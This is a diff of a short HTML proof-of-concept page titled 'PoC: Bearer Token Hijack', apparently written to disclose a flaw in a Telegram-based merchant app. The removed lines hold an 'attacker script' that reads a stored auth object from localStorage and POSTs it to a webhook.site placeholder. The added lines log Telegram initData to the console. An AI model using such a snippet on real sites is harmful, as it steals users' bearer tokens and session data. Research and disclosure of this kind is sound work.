@@ -8,17 +8,12 @@
   <h1>PoC: Bearer Token Hijack</h1>
   <p>Open console (F12) and check the logs.</p>
 
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
-  // Attacker script
-  const data = localStorage.getItem("wpayMerchant-redux-persist");
-  if (data) {
-    fetch("https://webhook.site/your-id", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ exfiltrated: data })
-    });
-  }
+  // Print initData in the console
+  console.log("🔐 Telegram initData:", Telegram.WebApp.initData);
 </script>
+
 
 </body>
 </html>
